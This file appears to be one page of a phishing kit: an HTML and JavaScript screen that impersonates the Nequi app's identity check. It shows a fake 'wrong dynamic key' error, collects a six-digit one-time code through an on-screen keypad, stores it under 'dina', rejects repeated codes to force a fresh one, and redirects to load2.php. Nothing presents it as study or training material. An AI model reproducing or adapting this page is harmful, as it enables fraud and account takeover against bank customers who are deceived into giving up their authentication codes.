<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Clave dinámica - Error</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Display.woff2');
      font-weight: bold;
      font-style: normal;
    }
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Italic.woff2');
      font-weight: normal;
      font-style: italic;
    }
    @font-face {
      font-family: 'Manrope';
      src: url('./Manrope-Normal.woff2');
      font-weight: normal;
      font-style: normal;
    }

    :root {
      --purple-primary: #200020;
      --gray-primary: #f2f4f7;
      --pink-primary: #da0081;
      --white: #ffffff;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Manrope', system-ui, sans-serif;
    }

    body {
      background: var(--white);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .homeSectionContainer {
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin: 0 auto;
      text-align: center;
    }

    .homeSectionContainer img {
      width: 150px;
      margin-bottom: 40px;
    }

    h1 {
      font-weight: 700;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: var(--purple-primary);
    }

    p.error-msg {
      color: red;
      font-size: 14px;
      text-align: center;
      margin-bottom: 20px;
    }

    .linesContainer {
      width: 271px;
      display: flex;
      justify-content: space-around;
      margin: 0 auto 20px;
    }

    .otpInput {
      width: 32px;
      color: var(--pink-primary);
      text-align: center;
      border: none;
      border-bottom: 1px solid var(--purple-primary);
      height: 30px;
      font-size: 40px;
      font-weight: 700;
    }

    .otpInput:focus {
      outline: none;
    }

    .screenKeyboard {
      margin-top: 2rem;
      width: 100%;
      max-width: 300px;
      margin-left: auto;
      margin-right: auto;
    }

    .keyboardRow {
      display: flex;
      justify-content: space-around;
      margin-bottom: 1rem;
    }

    .keyboardBtn {
      width: 48px;
      height: 48px;
      border: none;
      background: none;
      font-size: 2.25rem;
      color: var(--purple-primary);
      cursor: pointer;
      border-radius: 50%;
      transition: background-color 0.2s;
      -webkit-tap-highlight-color: rgba(0,0,0,0);
      touch-action: manipulation;
      user-select: none;
    }

    .keyboardBtn:hover {
      background-color: rgba(0, 0, 0, 0.05);
    }

    .keyboardBtn img {
      width: 28px;
      height: 28px;
    }

    .keyboardBtn.invisible {
      visibility: hidden;
    }

    .cancelBtn {
      margin-top: 30px;
      width: 100%;
      max-width: 260px;
      padding: 12px;
      border: 2px solid var(--purple-primary);
      background: var(--white);
      color: var(--purple-primary);
      border-radius: 10px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .cancelBtn:hover {
      background-color: #f9f5fa;
    }
  </style>
</head>

<body>
  <section class="homeSectionContainer">
    <img src="logo.png" alt="Logo Nequi">
    <h1>Confirma tu identidad</h1>
    <p class="error-msg">¡Ups! esa no es tu clave dinámica. Puedes consultarla en la App Nequi.</p>

    <div class="linesContainer">
      <input id="c1" class="otpInput" maxlength="1" readonly>
      <input id="c2" class="otpInput" maxlength="1" readonly>
      <input id="c3" class="otpInput" maxlength="1" readonly>
      <input id="c4" class="otpInput" maxlength="1" readonly>
      <input id="c5" class="otpInput" maxlength="1" readonly>
      <input id="c6" class="otpInput" maxlength="1" readonly>
    </div>

    <div class="screenKeyboard">
      <div class="keyboardRow">
        <button class="keyboardBtn">1</button>
        <button class="keyboardBtn">2</button>
        <button class="keyboardBtn">3</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">4</button>
        <button class="keyboardBtn">5</button>
        <button class="keyboardBtn">6</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn">7</button>
        <button class="keyboardBtn">8</button>
        <button class="keyboardBtn">9</button>
      </div>
      <div class="keyboardRow">
        <button class="keyboardBtn invisible" disabled></button>
        <button class="keyboardBtn">0</button>
        <button class="keyboardBtn delete" id="delete-otp">
          <img src="borrar.webp" alt="Borrar">
        </button>
      </div>
    </div>

    <button class="cancelBtn" onclick="window.location.href='index.php'">Cancelar el pago</button>
  </section>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const inputs = document.querySelectorAll('.otpInput');
      const keyboard = document.querySelector('.screenKeyboard');
      const deleteBtn = document.getElementById('delete-otp');
      let currentInput = 0;

      // Click en teclado numérico
      keyboard.addEventListener('click', (e) => {
        if (e.target.classList.contains('keyboardBtn') && e.target !== deleteBtn && !e.target.disabled) {
          const valor = e.target.textContent.trim();
          if (currentInput < inputs.length) {
            inputs[currentInput].value = '*';
            inputs[currentInput].dataset.realValue = valor;
            currentInput++;
            checkComplete();
          }
        }
      });

      // Botón borrar
      deleteBtn.addEventListener('click', () => {
        if (currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
        }
      });

      // Borrar con "Backspace"
      document.addEventListener('keydown', (ev) => {
        if (ev.key === 'Backspace' && currentInput > 0) {
          currentInput--;
          inputs[currentInput].value = '';
        }
      });

      // Bloquear escritura con teclado físico
      inputs.forEach(input => {
        input.readOnly = true;
        ['keydown', 'keyup', 'keypress', 'input', 'textInput'].forEach(eventType => {
          input.addEventListener(eventType, evt => evt.preventDefault());
        });
        input.addEventListener('paste', evt => evt.preventDefault());
      });

      function checkComplete() {
        if (currentInput === inputs.length) {
          let code = '';
          inputs.forEach(inp => {
            code += inp.dataset.realValue || '';
          });
          const previousDina = localStorage.getItem("dina");
          if (previousDina && previousDina === code) {
            document.querySelector('.error-msg').textContent =
              "¡Cuidado! Clave repetida. Inténtalo de nuevo.";
            setTimeout(() => {
              inputs.forEach(inp => {
                inp.value = '';
                delete inp.dataset.realValue;
              });
              currentInput = 0;
            }, 2500);
          } else {
            localStorage.setItem("dina", code);
            setTimeout(() => {
              window.location.href = "load2.php";
            }, 1500);
          }
        }
      }
    });
  </script>
</body>
</html>
